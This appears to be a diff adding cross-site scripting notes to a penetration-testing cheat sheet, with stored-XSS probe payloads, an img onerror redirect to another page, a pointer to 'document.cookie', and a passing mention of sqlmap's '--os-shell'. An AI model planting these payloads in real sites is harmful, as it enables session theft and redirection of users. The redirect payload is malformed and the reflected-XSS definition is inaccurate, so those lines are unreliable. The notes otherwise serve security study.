@@ -234,12 +234,44 @@ More simply just run `--os-shell`. There may be a problem with the specific type
 
 ---
 ## Cross Site Scripting (XSS)
+**Stored (Persistent)**
+*This is when XSS code is ran and stored server-side*
+Basic XSS identification payload
+```
+# Probably avoid this, as it is often detected and permitted
+<script>alert(window.origin)</script>
+```
+Other better ones are 
+```
+<script>print()</script>
+<plaintext>
+<script>alert(window.origin)</script>
+<img src=x onerror="windows.location.href="http://<otherwebpage>/">
+```
+To verify code has been ran successfully:
+1. See output in browser window (popup, new text )
+2. Check inspect elements and see if the payload has been inserted into the webpage
+For a specific value in a page like a `cookie`, use `document.cookie`
+
+**Reflected (Non-Persistent)**
+*This is when XSS code is ran server-side and not stored*
+
 **DOM**
-**Stored**
-**Reflected**
+*This is when XSS code is ran directly into the browser and not stored*
+
 **Discovery**
 **Phishing**
 **Hijacking**
+
+
+
+
+
+
+
+
+
+
 
 
 ---
